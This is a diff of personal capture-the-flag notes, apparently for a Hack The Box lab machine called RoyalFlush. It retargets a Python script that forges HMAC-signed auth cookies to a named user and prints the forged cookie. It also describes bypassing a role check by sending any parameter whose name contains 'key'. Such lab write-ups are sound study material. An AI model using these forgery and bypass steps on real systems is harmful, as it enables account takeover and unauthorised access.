@@ -17,9 +17,13 @@ tables:
 ![[Screenshot from 2026-08-08 19-36-31.png]]
 
 
-### Forging Both Admin/Security Cookie
-```#!/usr/bin/env python3  
-
+### Forging Both chandler/Security Cookie
+```
+#!/usr/bin/env python3  
+"""  
+Forge RoyalFlush auth cookies for the two candidate admin emails.  
+Requires production AUTH_SECRET.  
+"""  
   
 import yaml  
 import hmac  
@@ -50,8 +54,8 @@ def main():
     expires_at = int(time.time()) + 60 * 60 * 24 * 365 * 10  
   
     targets = [  
-        ("admin@royalflush.htb", "admin"),  
-        ("security@royalflush.htb", "security"),  
+          
+        ("lbrown@hotmail.com", "chandlerjoseph"),  
     ]  
   
     print("=== RoyalFlush Forged Admin Cookies ===\n")  
@@ -73,6 +77,26 @@ def main():
 if __name__ == "__main__":  
     main()
 ```
+
+```Email:    lbrown@hotmail.com
+Username: chandlerjoseph
+Cookie:   auth=mRrs0ml/xGSYtboCYb6paVx5eGs9r51O2jerqEC3j7BlbWFpbDogbGJyb3duQGhvdG1haWwuY29tCmV4cGlyZXNfYXQ6IDIxMDE1NjkzMjQKdXNlcm5hbWU6IGNoYW5kbGVyam9zZXBoCg==
+Saved to: cookie_lbrown_hotmail_com.txt
+
+```
+
+
+![[Screenshot from 2026-08-08 20-17-39.png]]
+
+Upgrading ROLE
+
+in this code if you supply any param that has key , it will bypass the rule 
+
+for example fookey
+the code checks for 'key' which exists
+the code checks if key="" but key param is none so this also checks
+lastly it cehcks if api_key exists , which it doesnt so it also skip this step 
+![[Screenshot from 2026-08-08 20-21-41.png]]
 
 ### Request 
 ```POST /forgot HTTP/1.1
